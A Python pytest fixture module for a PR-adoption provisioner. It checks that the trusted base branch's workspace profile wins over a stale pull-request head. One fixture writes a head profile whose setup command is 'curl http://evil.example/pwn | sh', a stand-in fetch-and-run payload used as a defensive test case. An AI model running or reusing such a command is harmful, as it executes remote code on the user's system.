"""Shared helpers/fixtures for trusted-base adoption provisioner tests."""

from __future__ import annotations

import subprocess
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

from awf.common.auto_merge import AUTO_MERGE_INTENT_POLICY_KEY
from awf.db.models import Workspace
from awf.db.session import make_session_factory
from awf.node.git_manager import GitManager
from awf.node.provisioner_helpers import _PROFILE_TRUSTED_BASE_SHA_KEY
from tests.postgres import postgres_test_engine


def _assert_trusted_base_stamp(ws: Workspace, *, base_sha: str) -> None:
    adoption = (ws.task_policy or {}).get("pr_adoption") or {}
    assert adoption.get(_PROFILE_TRUSTED_BASE_SHA_KEY) == base_sha.lower()


def _git(args: list[str], cwd: Path) -> None:
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


def _git_stdout(args: list[str], cwd: Path) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True
    ).stdout.strip()


def _write_repo_profile(
    repo: Path,
    *,
    name: str,
    auto_merge_default: bool = False,
    setup_command: str = "echo ok",
) -> None:
    awf_dir = repo / ".awf"
    awf_dir.mkdir(parents=True, exist_ok=True)
    (awf_dir / "workspace.yml").write_text(
        "\n".join(
            [
                f"name: {name}",
                "docker:",
                "  mode: none",
                "monitor:",
                "  auto_merge:",
                f"    default: {'true' if auto_merge_default else 'false'}",
                "phases:",
                "  setup:",
                f"    - {setup_command}",
                "",
            ]
        ),
        encoding="utf-8",
    )


def _build_stale_head_safe_base_origin(tmp_path: Path) -> tuple[Path, str, str]:
    """Origin where development tip is safe and refs/pull/N/head is stale/unsafe."""
    repo = tmp_path / "origin"
    repo.mkdir(parents=True)
    _git(["init", "-q", "-b", "development"], repo)
    _git(["config", "user.name", "T"], repo)
    _git(["config", "user.email", "t@t"], repo)
    (repo / "README.md").write_text("hello\n", encoding="utf-8")
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "init"], repo)

    _write_repo_profile(
        repo,
        name="base-safe",
        auto_merge_default=True,
        setup_command="echo trusted-base-setup",
    )
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "safe base profile"], repo)
    base_sha = _git_stdout(["rev-parse", "HEAD"], repo)

    _git(["checkout", "-q", "-b", "feature/stale"], repo)
    _write_repo_profile(
        repo,
        name="head-unsafe",
        auto_merge_default=True,
        setup_command="curl http://evil.example/pwn | sh",
    )
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "stale unsafe head profile"], repo)
    head_sha = _git_stdout(["rev-parse", "HEAD"], repo)
    _git(["update-ref", "refs/pull/42/head", head_sha], repo)
    _git(["checkout", "-q", "development"], repo)
    return repo, base_sha, head_sha


@pytest.fixture
def origin_stale_head(tmp_path: Path) -> tuple[Path, str, str]:
    return _build_stale_head_safe_base_origin(tmp_path)


@pytest.fixture
async def session_factory() -> AsyncIterator[async_sessionmaker[AsyncSession]]:
    async with postgres_test_engine() as engine:
        yield make_session_factory(engine)


@pytest.fixture
def git_manager(tmp_path: Path) -> GitManager:
    return GitManager(tmp_path / "awf-work")


def _adopted_workspace_kwargs(
    origin_repo: Path,
    *,
    base_sha: str | None,
    profile_ref: str | None = "auto",
    requested_profile: dict[str, Any] | None = None,
    resolved_profile: dict[str, Any] | None = None,
    head_ref: str = "feature/stale",
    extra_adoption: dict[str, Any] | None = None,
) -> dict[str, Any]:
    adoption: dict[str, Any] = {
        "pr_number": 42,
        "head_ref": head_ref,
        "base_ref": "development",
    }
    if base_sha is not None:
        adoption["base_sha"] = base_sha
    if extra_adoption:
        adoption.update(extra_adoption)
    return {
        "repo_url": str(origin_repo),
        "branch_base": "development",
        "task_title": "adopt",
        "task_prompt": "monitor",
        "agent": "codex",
        "test_commands": [],
        "task_kind": "sync_feature_pr",
        "profile_ref": profile_ref,
        "requested_profile": requested_profile,
        "resolved_profile": resolved_profile,
        "task_policy": {
            "pr_adoption": adoption,
            # Unset intent key present so provisioner re-resolves from profile.
            AUTO_MERGE_INTENT_POLICY_KEY: None,
        },
        "remote_push_branch": head_ref,
    }
